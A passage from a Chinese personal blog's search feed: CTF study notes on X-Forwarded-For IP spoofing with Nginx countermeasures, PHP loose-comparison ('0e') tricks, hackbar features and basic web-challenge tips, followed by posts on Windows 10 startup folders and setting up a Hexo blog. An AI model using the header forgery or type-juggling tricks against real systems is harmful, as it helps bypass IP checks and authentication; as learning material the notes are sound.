是一个一个依次 push 进去的，那么第一个 IP 就是用户的真实IP，取来用就好了。</p><p><strong>但是，事实有这么简单吗？</strong></p><blockquote><p>拓展：<a href="https://www.cnblogs.com/skychx/p/X-Forwarded-For-get-real-IP.html"><strong>你确信X-Forwarded-For 拿到的就是用户真实 IP 吗？</strong></a></p></blockquote><h4 id="ctf相关">CTF相关</h4><h5 id="攻击">攻击</h5><p>从安全的角度上考虑，整个系统最不安全的就是人，用户端都是最好攻破最好伪造的。有些用户就开始钻协议的漏洞：<code>X-Forwarded-For</code>是代理服务器添加的，如果我一开始请求的 Header 头里就加了<code>X-Forwarded-For</code> ，不就骗过服务器了吗？</p><p><strong>1.</strong> 首先从客户端发出请求，带有<code>X-Forwarded-For</code> 请求头，里面写一个伪造的 IP：</p><pre><code class="hljs groovy">X-Forwarded-<span class="hljs-attr">For:</span> fakeIP</code></pre><p><strong>2.</strong> 服务端第一层代理服务收到请求，发现已经有<code>X-Forwarded-For</code>，误把这个请求当成代理服务器，于是向这个字段追加了客户端的真实IP：</p><pre><code class="hljs axapta">X-Forwarded-For: fakeIP, <span class="hljs-keyword">client</span></code></pre><p><strong>3.</strong> 经过几层代理后，最终的服务器拿到的 Header是这样的：</p><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For: fakeIP, client, proxy<span class="hljs-number">1</span>, proxy<span class="hljs-number">2</span></code></pre><p>要是按照取 <code>X-Forwarded-For</code> 第一个 IP的思路，你就着了攻击者的道了，你拿到的是 fakeIP，而不是 client IP。</p><h5 id="破招">破招</h5><ol type="1"><li>服务端如何破招？上面三个步骤：</li></ol><ul><li><p>第一步是客户端造假，服务器无法介入</p></li><li><p>第二步是代理服务器，可控，可防范</p></li><li><p>第三步是应用服务器，可控，可防范</p><p>2.第二步的破解我拿 Nginx 服务器举例。</p></li></ul><p>我们在最外层的 Nginx 上，对 <code>X-Forwarded-For</code>的配置如下：</p><pre><code class="hljs nginx"><span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$remote_addr</span>;</code></pre><p>什么意思呢？就是<strong>最外层代理服务器不信任客户端的<code>X-Forwarded-For</code> 输入，直接覆盖，而不是追加</strong>。</p><p>非最外层的 Nginx 服务器，我们配置：</p><pre><code class="hljs nginx"><span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;</code></pre><p><code>$proxy_add_x_forwarded_for</code> 就是追加 IP的意思。通过这招，就可以破解用户端的伪造办法。</p><p>第三步的破解思路也很容易，正常思路我们是取<code>X-Forwarded-For</code>最左侧的IP，这次我们反其道而行之，<strong>从右边数，减去代理服务器的数目</strong>，那么剩下的IP 里，最右边的就是真实 IP。</p><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For: fakeIP, client, proxy<span class="hljs-number">1</span>, proxy<span class="hljs-number">2</span></code></pre><p>比如说我们已知代理服务有两层，从右向左数，把 <code>proxy1</code> 和<code>proxy2</code> 去掉，剩下的 IP 列表最右边的就是真实 IP。。</p><h3 id="一句话总结总结"><strong>5.一句话总结总结</strong></h3><p>通过 <code>X-Forwarded-For</code> 获取用户真实 IP时，最好不要取第一个 IP，以防止用户伪造 IP。</p><h2 id="dns服务器">DNS服务器</h2><p>https://zhuanlan.zhihu.com/p/139303753</p><p>我们在上网的时候，通常输入的是网址，其实这就是一个域名，而我们计算机网络上的计算机彼此之间只能用IP地址才能相互识别。将域名映射为IP地址的过程就称为“域名解析”。在Internet上域名与IP地址之间是一对一（或者多对一）的，也可采用DNS轮循实现一对多，域名虽然便于人们记忆，但机器之间只认IP地址，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析服务器来完成，<strong>DNS就是进行域名解析的服务器。</strong></p><p><img src="https://s3.ax1x.com/2020/11/26/DBYQsS.jpg" alt="DBYQsS.jpg"></p><h2 id="cookie">cookie</h2><p>https://zhuanlan.zhihu.com/p/22396872</p><p>https://www.kancloud.cn/kancloud/http-cookies-explained/48325</p><p>简单地说，cookie 就是浏览器储存在用户电脑上的一小段文本文件。cookie是纯文本格式，不包含任何可执行的代码。一个 Web页面或服务器告知浏览器按照一定规范来储存这些信息，并在随后的请求中将这些信息发送至服务器，Web服务器就可以使用这些信息来识别不同的用户。大多数需要登录的网站在用户验证成功之后都会设置一个cookie，只要这个 cookie存在并可以，用户就可以自由浏览这个网站的任意页面。再次说明，cookie只包含数据，就其本身而言并不有害。</p><h2 id="hackbar">hackbar</h2><p><strong>Encryption:对数据进行加密(有多种加密形式)；</strong><strong>Encoding</strong>:各类编码；<strong></strong>SQL<strong>:SQL注入； </strong>XSS<strong>:XSS攻击；</strong>LFI<strong>:LFI漏洞；</strong>XXE<em>:XXE攻击；:其他选项，包含Jsonify,Uppercase,Lowercase;<strong></strong>Load URL</em>:加载网址，将网址加载进框，便于修改；<strong></strong>SplitURL<em>:切分网址，自动切分，快速找出需要改的地方；<strong></strong>Execute</em>:执行，相当于F5；<strong> </strong>Postdata<em>:将要发送的数据填入此处；<strong> </strong>Referer</em>:刷新；**User Agent*:用户代理；**</p><p>Cookies*:网页cookie; **Clear ALL*:清除全部;</p><h2 id="php">PHP</h2><h3 id="学习地址">学习地址</h3><p>https://www.php.cn/php/php-variables.html</p><h3 id="弱类型比较">弱类型比较</h3><p><strong>php中有两种比较的符号 == 与 ===</strong></p><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p><p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><pre><code class="hljs plain">如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</code></pre><p><strong>这里明确了说如果一个数值和字符串进行比较的时候，会将字符串转换成数值</strong></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>var_dump(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span>var_dump(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span>var_dump(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>) <span class="hljs-comment">//false</span>var_dump(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>) <span class="hljs-comment">//true</span>var_dump(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true</span><span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//上述代码可自行测试</span></code></pre><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>观察上述代码，<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span> 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是<span class="hljs-number">0</span>自然和<span class="hljs-number">0</span>相等<span class="hljs-symbol">2 </span><span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span> 比较的时候会将<span class="hljs-number">1</span>admin转化成数值,结果为<span class="hljs-number">1</span>，而“admin1“==<span class="hljs-number">1</span> 却等于错误，也就是<span class="hljs-string">&quot;admin1&quot;</span>被转化成了<span class="hljs-number">0</span>,为什么呢？？<span class="hljs-symbol">3 </span><span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e456789&quot;</span>相互比较的时候，会将<span class="hljs-number">0e</span>这类字符串识别为科学技术法的数字，<span class="hljs-number">0</span>的无论多少次方都是零，所以相等</code></pre><p><strong>对于上述的问题我查了php手册</strong></p><pre><code class="hljs cpp">当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>并且其数值值在整形的范围之内该字符串被当作<span class="hljs-keyword">int</span>来取值，其他所有情况下都被作为<span class="hljs-keyword">float</span>来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为<span class="hljs-number">0</span>。</code></pre><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>&lt;?php<span class="hljs-symbol">2 </span>$test=<span class="hljs-number">1</span> + <span class="hljs-string">&quot;10.5&quot;</span>; // $test=<span class="hljs-number">11.5</span>(float)<span class="hljs-symbol">3 </span>$test=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;-1.3e3&quot;</span>; //$test=-<span class="hljs-number">1299</span>(float)<span class="hljs-symbol">4 </span>$test=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;bob-1.3e3&quot;</span>;//$test=<span class="hljs-number">1</span>(<span class="hljs-keyword">int</span>)<span class="hljs-symbol">5 </span>$test=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;2admin&quot;</span>;//$test=<span class="hljs-number">3</span>(<span class="hljs-keyword">int</span>)<span class="hljs-symbol">6 </span>$test=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;admin2&quot;</span>;//$test=<span class="hljs-number">1</span>(<span class="hljs-keyword">int</span>)<span class="hljs-symbol">7 </span>?&gt;</code></pre><p><strong>所以就解释了"admin1"==1 =&gt;False 的原因</strong></p><p>eg：<strong>在进行弱类型比较时，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</strong></p><pre><code class="hljs awk">var_dump(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e99999&quot;</span>); <span class="hljs-regexp">//</span>true</code></pre><h2 id="ctf-wp">CTF wp:</h2><h5 id="get-改数据">3.get 改数据</h5><p>后的/ 有无都可以，但？后面都是参数，？表示与URL区分开</p><h5 id="post改数据">4.POST改数据</h5><h6 id="鼠标不要在空白区域点击不然会悄悄产生换行符导致长度不一样所以flag不同">1.鼠标不要在空白区域点击，不然会悄悄产生换行符导致长度不一样所以flag不同</h6><h6 id="用burp-suite来传参不过要把get改成post还要加一行">2.<strong>用BurpSuite来传参，不过要把GET改成POST，还要加一行</strong></h6><pre><code class="hljs isbl"><span class="hljs-variable">Content</span>-<span class="hljs-variable">Type</span>:<span class="hljs-variable"><span class="hljs-class">application</span></span>/<span class="hljs-variable">x</span>-<span class="hljs-variable">www</span>-<span class="hljs-variable">form</span>-<span class="hljs-function"><span class="hljs-title">urlencoded</span>(;<span class="hljs-variable">charset</span>=<span class="hljs-variable">utf</span>-<span class="hljs-number">8</span>)</span></code></pre><h5 id="矛盾">5.矛盾</h5><p><strong>is_numeric</strong> <strong>—</strong><strong>检测变量是否为数字</strong></p><p><strong>是数字和数字字符串则返回</strong> TRUE，否则返回FALSE</p><h6 id="复习http">复习HTTP</h6><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.aspxfans.com:<span class="hljs-number">8080</span><span class="hljs-regexp">/news/i</span>ndex.asp?boardID=<span class="hljs-number">5</span>&amp;ID=<span class="hljs-number">24618</span>&amp;page=<span class="hljs-number">1</span><span class="hljs-comment">#name</span></code></pre><ol type="1"><li>文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“<strong>index.asp</strong>”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</li><li>锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</li><li><strong>参数部分</strong>：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符</li></ol><h5 id="web3">6.web3</h5><p>解码</p><h5 id="域名解析可">7.域名解析（可）</h5><h5 id="停下来">8.停下来</h5><p>多按几次发送就好了</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>win10软件设置开机启动</title>
    <link href="/2020/11/22/win10%E8%BD%AF%E4%BB%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/"/>
    <url>/2020/11/22/win10%E8%BD%AF%E4%BB%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="title-win10软件设置开机启动">title: win10软件设置开机启动</h1><h2 id="方法一">方法一：</h2><p>我们打开文件夹：</p><p>C:（用户）（当前用户名）Menu（「开始」菜单）（程序）（启动）即可找到启动文件夹</p><center><img src="https://s3.ax1x.com/2020/11/22/D83l80.png"></center><h2 id="方法二">方法二：</h2><p>在运行中粘贴以下路径回车打开</p><ol type="1"><li><p>按键win+r</p></li><li><pre><code>   %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><center><p><img src="https://s3.ax1x.com/2020/11/22/D83oM8.png"></p></center></li></ol>]]></content>
    
    
    <categories>
      
      <category>电脑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>win10</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何搭建个人博客</title>
    <link href="/2020/11/07/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2020/11/07/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="如何搭建个人博客">如何搭建个人博客</h1><p>2020-11-07 21:21:33</p><center><img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="https://s1.ax1x.com/2020/11/11/BvAsW4.png"><br><div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">博客界面示例</div></center><h2 id="why博客">why博客？</h2><ul><li>想先说一下这个古老的东西“博客”，有人说博客已经过时了，现在大多数人都用手机看朋友圈、微博等。是的，但是每当从google或者百度上找到一篇优质的资料我发现是出自个人博客的概率很大。</li><li>曾经问过一个大佬在学习上又没有什么习惯或者技巧，他说“我每当解决一个问题之后都会总结并记录下来”。是的自己也深有体会，每次google半天解决的问题，不做记录的话过一段时间再遇到一样会去google半天去找，可能这就是平常人与大佬们的区别吧。</li><li>最后用在一个个人博客上看到的一句话来开始这篇文章“对任何渴望进步的人来说，写博客/文章/回答对自己的成长帮助都是巨大的。频率和数量不必过分强求，有话要说就写写，没事就歇歇，随意点。<u><em>因为坚持写作的那一刻起，你就已经开始受益。</em></u></li></ul><h2 id="wordpress和hexo哪个更适合用来搭建个人博客">wordpress和hexo哪个更适合用来搭建个人博客？</h2><p>目前搭建独立的个人博客有很多种方式，你可以选择购买主机搭建动态博客 -<a href="https://zh-cn.wordpress.com/">WordPress</a>等，也可以使用GithubPages来搭建一个静态的个人博客。</p><h3 id="wordpress获得个人网站域名来搭建个人博客">WordPress:获得个人网站域名来搭建个人博客</h3><ul><li>域名是网站的入口，也是网站的第一印象，比如饿了么的官网的域名是：https://www.ele.me/，很是巧妙。常见的有com,cn,net,org等后缀，也有小众的xyz,me,io等后缀，域名是可以购买的，根据你自己的喜好，选择不同的后缀。很多小众奇特的后缀在大陆是没办法备案的，网站也就无法上线。然而使用GitHub托管我们的网站，完全不需要备案，因为托管我们的网站内容的服务器在美国，而且在国内备案流程也比较繁杂，时间需要一周左右。申请域名的地方有很多，域名购买是要花钱的，热门网站：<a href="https://cn.aliyun.com/">阿里云</a>如果你已经有了空闲域名就无需购买，直接使用即可。ps:注册一个Github账号，申请学生包可以获得一个免费的顶级域名</li></ul><h3 id="使用-github-pages-服务搭建博客"><strong>使用 GitHub Pages服务搭建博客：</strong></h3><ol type="1"><li>全是静态文件，访问速度快；</li><li>免费方便，不用花钱就可以搭建个人博客，不需要服务器不需要后台；</li><li>可以随意绑定自己的域名；</li><li>数据绝对安全，基于 GitHub的版本管理，想恢复到哪个历史版本都行；</li><li>博客内容可以轻松打包、转移、发布到其它平台；</li><li>自己可以随性所欲的设计，美观大气上档次；</li></ol><h3 id="总结"><strong>总结</strong></h3><ul><li><p>有服务器的选择WP，写文章方便，适合搭好了之后给没有程序基础的人使用。没服务器的，喜欢简洁的使用 Hexo。可以折腾，而且也优雅。</p></li><li><p>我选择了现在很热门的Github Pages + Hexo的方式来搭建独立的个人博客。 wordpress如何搭建见https://www.zhihu.com/question/20463581</p></li></ul><hr><h2 id="用hexo搭建博客大致流程">用hexo搭建博客大致流程</h2><ol type="1"><li>有一个 GitHub 账号，没有的话去注册一个；</li><li>安装 node.js、npm，并了解相关基础知识；</li><li>安装 git for windows（或者其它 git 客户端）；</li></ol><h3 id="一-.-注册github账号">一 . 注册GitHub账号</h3><ul><li>进入GitHub官网<a href="github.com/">github.com</a>，新用户注册，<strong>记住</strong>注册的账号名和邮箱，后面会用到。</li><li>ps: 如果是学生，还可以获得GitHub提供的丰厚学生包</li></ul><h4 id="github学生包申请最好申请">GitHub学生包申请（最好申请）</h4><center><img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="https://s3.ax1x.com/2020/11/11/BvZuLR.png"><br><div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">GitHub学生包</div></center><ul><li><p>为什么要申请GitHub学生包</p><p>Github 学生包包含很多开发者工具，比较吸引的是 DigitalOcean 的 50美元代金券和 NameCheap 的免费 .me 域名和 Comodo 的 SSL证书,免费薅羊毛不要白不要</p></li><li><p>申请条件</p><p>年龄大于 13岁并正在进行可能被授予学位或学历的课程，意味着你从初中开始就可以申请学生包了。你只需要一个学校提供的电子邮箱地址，或有效的学生证件或是任何官方入学证明。</p></li><li><p>申请教程</p><p>这里不多阐述，可以在网上随意的找到，附上一个CSDN里的教程：<a href="https://blog.csdn.net/qq_36667170/article/details/79084166">Github学生包申请</a></p></li></ul><h3 id="二-.-github创建一个仓库">二 . GitHub创建一个仓库</h3><ul><li>登录完成之后，在你的主页点击图标 Start a project创建一个新的仓库，或者右上角的+ New repository来新建仓库</li></ul><blockquote><center><img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="https://s1.ax1x.com/2020/11/11/BjzgsO.png"><br><div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">创建仓库</div></center></blockquote><ul><li>因为我们是使用 Github Pages 去搭建我们的静态博客，所以版本库的名称是<strong>你的用户名+.github.io</strong>。如：我的用户名是：luoman666，那么仓库的名字应该是： luoman666.github.io，<strong>这个是一定不能出错的</strong>。因为之后你将要访问的你的博客地址就是：https://luoman666.github.io ,这个就是你博客的域名</li></ul><blockquote><center><img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="https://s1.ax1x.com/2020/11/11/BvC7NQ.jpg"><br><div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">因为我创建过，所以这里是警告⚠</div></center></blockquote><h2 id="未完待续........溜掉嘿嘿">未完待续........（溜掉嘿嘿）</h2>]]></content>
    
    
    <categories>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
